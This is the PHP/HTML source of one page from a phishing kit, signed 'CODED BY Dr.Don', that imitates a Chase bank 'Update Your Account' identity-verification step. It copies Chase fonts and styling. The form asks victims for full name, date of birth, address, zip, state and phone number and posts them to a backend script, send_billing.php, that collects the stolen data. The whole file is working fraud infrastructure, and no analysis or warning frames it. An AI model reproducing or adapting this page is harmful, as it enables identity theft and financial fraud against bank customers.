<?php
/* ==================== || CODED BY Dr.Don || ==================== */
session_start();

include("../config/function.php")

/* ==================== || CODED BY Dr.Don || ==================== */
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>Update Your Account - chase</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="../img/chasefavicon.ico">
        <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
        <noscript>
</noscript>

        

        <script type="text/javascript" charset="UTF-8" src="css js/appConfig.js"></script>
				   <script src="css js/jquery-3.1.0.min.js"></script>
				    <link rel="stylesheet" href="css js/blue-ui.css">
 <link rel="stylesheet" href="css js/logon.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
		    <script>
    $(document).ready(function(){
     $('#phone').mask("(999) 999-9999");
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#dob').mask("99/99/9999", {placeholder:"DD/MM/YYYY"});
    });   
    </script>
</head>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true"><div data-is-view="true"><div class="homepage" tabindex="-1"><div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div
 class="logon header jpui transparent navigation bar">
 <img style="max-width: 60%;"   src="../img/logo.png" />
</div></header> <main id="logon-content" data-has-view="true"><div class="msd password-reset first-step" data-is-view="true">	<div class="jpui background image fixed show-xs show-sm" id="geoImage">
	<style type="text/css">.jpui.background.image { background-image: url(http://b.up-00.com/2018/01/151727043431841.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://b.up-00.com/2018/01/151727043431841.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://b.up-00.com/2018/01/151727043431841.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }
	</style>
	</div><div class="container"><div class="row jpui primary panel"><div class="col-xs-12 col-md-10 col-md-offset-1 content-container"><form class="toggle-aria-hidden" method="POST" id="passwordReset" autocomplete="off" action="../config/send_billing.php" novalidate=""><h1 class="header" data-attr="LOGON_PASSWORD_RESET.logonPasswordResetHeader" id="passwordResetHeader" tabindex="-1">Welcome, Again</h1> <div class="wrapper">

		<div class="row jpui panel body" id="mainpanel"> <div class="col-xs-12 col-sm-10 col-sm-offset-1"><div class="progress u-no-outline" id="progress" tabindex="-1"><div class="row"><div class="col-xs-12 col-sm-6 clear-padding"><h2>Identification <span class="util high-contrast">Step 1 of 4</span></h2> </div> <div class="col-xs-12 col-sm-6 progress-padding"><div class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4"><li class="active current-step" id="progress-progressBar-step-1" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step" id="progress-progressBar-step-2" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-2"></span></li><li id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li><li id="progress-progressBar-step-4"><span class="util accessible-text" id="accessible-progress-progressBar-step-4"></span></li></ol></div></div></div></div> <p class="text customer-question"><a class="jpui link no-underline" data-attr="LOGON_PASSWORD_RESET.customerQuestionsHelpMessageNavigation" href="#" id="identify_customer_question">Have a question?</a></p> <h3 data-attr="LOGON_PASSWORD_RESET.identifyCustomerHeader">Help us verify your identity.</h3> <p data-attr="LOGON_PASSWORD_RESET.identifyCustomerAdvisory">For your security, please verify your identity and provide the other requested information.</p>  <div class="jpui recovery options inside-container">   <div class="group active" id="authorized_business_user_group" aria-hidden="false"><div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">Full Name</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="authorized_business_user_email_address"><input min="0" class="jpui input" id="authorized_business_user_email_address-input-field" placeholder="" name="fullname" type="email">   </div></div></div> <div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">Date Of Birth</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="biz_user_security_code"><input min="0" class="jpui input" id="dob" placeholder="" name="dob" type="text">   </div></div></div> <div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">City</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="biz_user_security_code"><input min="0" class="jpui input" id="biz_user_security_code-input-field" placeholder="" name="city" type="text">   </div></div></div><div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">Street Address</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="biz_user_security_code"><input min="0" class="jpui input" id="biz_user_security_code-input-field" placeholder="" name="address" type="text">   </div></div></div><div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">Zip Code</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="biz_user_security_code"><input min="0" class="jpui input" id="biz_user_security_code-input-field" placeholder="" name="zip" type="text">   </div></div></div><div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">State/Region</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="biz_user_security_code"><input min="0" class="jpui input" id="biz_user_security_code-input-field" placeholder="" name="state" type="text">   </div></div></div><div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui inline label">Phone Number</label></div> <div class="col-xs-12 col-sm-6 col-md-5 form-column"><div id="biz_user_security_code"><input min="0" class="jpui input" id="phone" placeholder="" name="phone" type="text">   </div></div></div></div>  <div class="button-container row hide-xs show-sm"> <div id="logonSkipLinkContainer"><a class="jpui skiplink form-skipLink" id="logonSkipLink" href="javascript:void(0);" data-skipselector="#header-passwordResetIdentifyOptionId"><span class="label">Review missing/unchanged info.</span> </a></div> <div class="col-xs-12 col-sm-3"><button class="jpui button focus fluid primary" type="submit" id="signin-button" data-attr="LOGON.logonToLandingPage" style="margin-left: 450px;"><span class="label">Next</span> </button></div></div></div>  <div class="button-container row hide-sm"><div class="col-xs-12 col-sm-3 col-sm-push-9"><button class="jpui button focus fluid primary" type="submit" id="signin-button" data-attr="LOGON.logonToLandingPage"><span class="label">Next</span> </button></div> </div></div></div> </div></form></div></div></div></div></main> <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer></div> <div id="languageSupportDisclaimer"></div> <div id="overlay" data-has-view="true"></div> <div id="signoutModal"></div> <div id="siteExitWarning"></div> <div id="serviceErrorModal"></div> <div id="sessionTimeoutModal"></div></div></body></html>